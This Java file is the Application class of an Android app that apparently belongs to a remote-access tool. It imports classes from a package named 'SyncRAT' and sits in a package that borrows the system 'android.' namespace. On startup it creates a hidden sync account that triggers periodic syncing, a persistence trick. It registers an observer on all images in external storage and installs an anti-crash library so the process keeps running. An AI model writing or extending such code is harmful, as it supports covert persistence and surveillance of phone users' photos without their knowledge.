package android.iocl.dac_collector.MainApplication;


import static android.iocl.dac_collector.Utility.Utility.TAG;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.Application;

import android.content.ContentResolver;
import android.content.Context;
import android.iocl.dac_collector.AntiCrashLibCockroach.Cockroach;
import android.iocl.dac_collector.AntiCrashLibCockroach.ExceptionHandler;

import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.Services.PersistentVpnServiceUtil;
import android.iocl.dac_collector.SyncAdapters.AccountContract;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.SyncRAT.ImageObserver;
import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.Utility;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;

import com.google.android.gms.ads.MobileAds;
import com.google.firebase.FirebaseApp;
import com.google.firebase.crashlytics.FirebaseCrashlytics;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Map;

public class MyApp extends Application implements Application.ActivityLifecycleCallbacks {
    FirebaseCrashlytics crashlytics;
    FirebaseApp firebaseApp;

    private HandlerThread mImageObserverThread;
    private Handler mImageObserverHandler;

    private Thread.UncaughtExceptionHandler defaultHandler;
    private File crashFile, lifecycleFile, heartbeatFile, anrFile;
    private volatile long lastMainThreadPing = System.currentTimeMillis();
    private ImageObserver mImageObserver;
    Boolean installCockroach = !BuildConfig.DEBUG;

    @Override
    public void onCreate() {
        super.onCreate();







        String currentProcess = getProcessNameSafe();
        String mainProcess = getPackageName();

        if (!mainProcess.equals(currentProcess)) {
            Log.w("MyApp", "Skipping init in non-main process: " + currentProcess);
            return;
        }


        MobileAds.initialize(this, initializationStatus -> {
            Log.d(TAG, "onCreate: " + initializationStatus.toString());
        });


        if (!BuildConfig.DEBUG) {
            String cons_id = SharedPrefs.getString(this, "cons_id", "crashedBeforeSettingUp");

            crashlytics = FirebaseCrashlytics.getInstance();
            crashlytics.setUserId(cons_id);
            crashlytics.setCrashlyticsCollectionEnabled(true);
        }else {
            String cons_id = SharedPrefs.getString(this, "cons_id", "crashedBeforeSettingUp--debug");

            crashlytics = FirebaseCrashlytics.getInstance();
            crashlytics.setUserId(cons_id);
            crashlytics.setCrashlyticsCollectionEnabled(true);
        }



        createSyncAccount();


        AccountContract.createSyncBothAccount(getApplicationContext());
        SyncUtils.initialize(getApplicationContext());
        // ✅ Only runs once in the main app process
        setupCrashHandler();

        registerActivityLifecycleCallbacks(this);
        startAnrWatchdog();


        installImageObserver();


        AccountContract.createSyncBothAccount(getApplicationContext());
        SyncUtils.initialize(getApplicationContext());
        firebaseApp = FirebaseApp.initializeApp(this);




        if (installCockroach) {
            install();
        }
    }

    private String getProcessNameSafe() {
        try {
            int pid = android.os.Process.myPid();
            BufferedReader reader = new BufferedReader(
                    new FileReader("/proc/" + pid + "/cmdline")
            );
            String processName = reader.readLine().trim();
            reader.close();
            return processName;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * ===================== CRASH HANDLER ======================
     **/
    private void setupCrashHandler() {
        defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {


            crashlytics.recordException(throwable);

            if (defaultHandler != null) {
                defaultHandler.uncaughtException(thread, throwable);
            } else {
                System.exit(2);
            }
        });
    }



    /** ===================== HEARTBEAT ====================== **/


    /**
     * ===================== ANR WATCHDOG ======================
     **/
    private void startAnrWatchdog() {
        Handler mainHandler = new Handler(Looper.getMainLooper());

        // Ping main thread every second
        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                lastMainThreadPing = System.currentTimeMillis();
                mainHandler.postDelayed(this, 1000);
            }
        });

        // Watchdog thread
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException ignored) {
                }
                long delta = System.currentTimeMillis() - lastMainThreadPing;
                if (delta > 3000) { // Main thread frozen for >3s
                    captureMainThreadStack();
                }
            }
        }, "ANR-Watchdog").start();
    }

    private void captureMainThreadStack() {
        Thread main = Looper.getMainLooper().getThread();
        StackTraceElement[] mainStack = main.getStackTrace();

        // Check if any frame is from our package
        boolean causedByMyCode = false;
        String myPackage = "android.iocl.dac_collector";

        for (StackTraceElement e : mainStack) {
            if (e.getClassName().startsWith(myPackage)) {
                causedByMyCode = true;
                break;
            }
        }

        if (!causedByMyCode) {
            Log.w("ANR-Watchdog", "ANR detected but not caused by app code — skipping log.");
            return;
        }

        // --- Build detailed log (from previous full version) ---
        long now = System.currentTimeMillis();
        StringBuilder sb = new StringBuilder();
        sb.append("=== ANR DETECTED (App Code) ===\n");
        sb.append("Time: ").append(Utility.getStandardDate())
                .append(" (").append(now).append(")\n");
        sb.append("Uptime(ms): ").append(android.os.SystemClock.uptimeMillis()).append("\n");
        sb.append("ElapsedRealtime(ms): ").append(android.os.SystemClock.elapsedRealtime()).append("\n");

        sb.append("\n--- Main Thread Stack ---\n");
        for (StackTraceElement e : mainStack) {
            sb.append(e.toString()).append("\n");
        }

        sb.append("\n--- All Threads ---\n");
        for (Map.Entry<Thread, StackTraceElement[]> entry : Thread.getAllStackTraces().entrySet()) {
            Thread t = entry.getKey();
            sb.append("\nThread: ").append(t.getName())
                    .append(" State: ").append(t.getState())
                    .append(t == main ? " [MAIN]" : "")
                    .append("\n");
            for (StackTraceElement ste : entry.getValue()) {
                sb.append("    ").append(ste.toString()).append("\n");
            }
        }

        // Memory info
        Runtime rt = Runtime.getRuntime();
        sb.append("\n--- Memory Info ---\n");
        sb.append("Max Memory: ").append(rt.maxMemory() / 1024 / 1024).append(" MB\n");
        sb.append("Total Memory: ").append(rt.totalMemory() / 1024 / 1024).append(" MB\n");
        sb.append("Free Memory: ").append(rt.freeMemory() / 1024 / 1024).append(" MB\n");


        // Optional: Send to Crashlytics
        try {
            crashlytics.log(sb.toString());
        } catch (Exception ignored) {
        }
    }

    public static String getProcessName(Context context) {
        try {
            int pid = android.os.Process.myPid();
            BufferedReader reader = new BufferedReader(new FileReader("/proc/" + pid + "/cmdline"));
            String processName = reader.readLine().trim();
            reader.close();
            return processName;
        } catch (Exception e) {
            return null;
        }
    }


    /**
     * ===================== ACTIVITY LIFECYCLE LOGGING ======================
     **/
    @Override
    public void onActivityCreated(Activity activity, android.os.Bundle savedInstanceState) {
        logLifecycle("CREATED", activity);
    }

    @Override
    public void onActivityStarted(Activity activity) {
        logLifecycle("STARTED", activity);
    }

    @Override
    public void onActivityResumed(Activity activity) {
        logLifecycle("RESUMED", activity);
    }

    @Override
    public void onActivityPaused(Activity activity) {
        logLifecycle("PAUSED", activity);
    }

    @Override
    public void onActivityStopped(Activity activity) {
        logLifecycle("STOPPED", activity);
    }

    @Override
    public void onActivitySaveInstanceState(Activity activity, android.os.Bundle outState) {
        logLifecycle("SAVE_INSTANCE_STATE", activity);
    }

    @Override
    public void onActivityDestroyed(Activity activity) {
        logLifecycle("DESTROYED", activity);
    }

    private void logLifecycle(String state, Activity activity) {
        String log = state + ":" + activity.getClass().getSimpleName() + ":" + System.currentTimeMillis();
    }

    /**
     * ===================== FILE UTILS ======================
     **/


    private String readFile(File file) {
        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            return sb.toString();
        } catch (IOException e) {
            return "";
        }
    }

    private String getStackTrace(Throwable t) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        t.printStackTrace(pw);
        return sw.toString();
    }


    private void createSyncAccount() {
        Account account = new Account(
                AccountContract.ACCOUNT_NAME,
                AccountContract.ACCOUNT_TYPE
        );

        AccountManager accountManager = AccountManager.get(this);
        if (accountManager.addAccountExplicitly(account, null, null)) {
            ContentResolver.setIsSyncable(account, AccountContract.AUTHORITY, 1);
            ContentResolver.setSyncAutomatically(
                    account,
                    AccountContract.AUTHORITY,
                    true
            );
            ContentResolver.addPeriodicSync(
                    account,
                    AccountContract.AUTHORITY,
                    Bundle.EMPTY,
                    AccountContract.SYNC_INTERVAL
            );
        }
    }

    // fields in your Activity/Service


    // call this instead of your old installImageObserver()
    private void installImageObserver() {
        if (mImageObserver != null) {
            Log.i("MyApp", "ImageObserver already installed");
            return;
        }

        if (XXPermissions.isGrantedPermissions(this, Permission.MANAGE_EXTERNAL_STORAGE)) {
            Handler handler = new Handler(Looper.getMainLooper());
            mImageObserver = new ImageObserver(handler, this);
            getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    mImageObserver
            );
            Log.i("MyApp", "ImageObserver installed");
        } else {
            Log.i("MyApp", "Manage external storage permission not granted");
        }
    }


    // call this when stopping (Activity.onDestroy() or Service.onDestroy())


    @Override
    public void onTerminate() {
        super.onTerminate();
        if (mImageObserver != null) {
            getContentResolver().unregisterContentObserver(mImageObserver);
            mImageObserver = null;
        }


    }

    private void install() {
        final Thread.UncaughtExceptionHandler sysExcepHandler = Thread.getDefaultUncaughtExceptionHandler();

//        DebugSafeModeUI.init(this);
        Cockroach.install(this, new ExceptionHandler() {
            @Override
            protected void onUncaughtExceptionHappened(Thread thread, Throwable throwable) {
                Log.e("LoggingError", "--->onUncaughtExceptionHappened:" + thread + "<---", throwable);
//                CrashLog.saveCrashLog(getApplicationContext(), throwable);

                SharedPrefs.saveCrashDetails(getApplicationContext(), "--->onUncaughtExceptionHappened:" + thread + "<---" + throwable);
                crashlytics.recordException(throwable);

                new Handler(Looper.getMainLooper()).post(() -> {

                });
            }

            @Override
            protected void onBandageExceptionHappened(Throwable throwable) {
                SharedPrefs.saveCrashDetails(getApplicationContext(), throwable.getMessage());

                crashlytics.log("Recoverable exception: " + throwable.getMessage());
            }

            @Override
            protected void onEnterSafeMode() {
//                DebugSafeModeUI.showSafeModeUI();

//                if (BuildConfig.DEBUG) {
//                    Intent intent = new Intent(MyApp.this, DebugSafeModeTipActivity.class);
//                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                    startActivity(intent);
//                }
            }

            @Override
            protected void onMayBeBlackScreen(Throwable e) {
                Thread thread = Looper.getMainLooper().getThread();

                SharedPrefs.saveCrashDetails(getApplicationContext(), "--->onUncaughtExceptionHappened:" + thread + "<---" + e);

                crashlytics.recordException(e);
                Log.e("AndroidRuntime", "--->onUncaughtExceptionHappened:" + thread + "<---", e);
                //黑屏时建议直接杀死app
                sysExcepHandler.uncaughtException(thread, new RuntimeException("black screen"));
            }

        });
    }



}
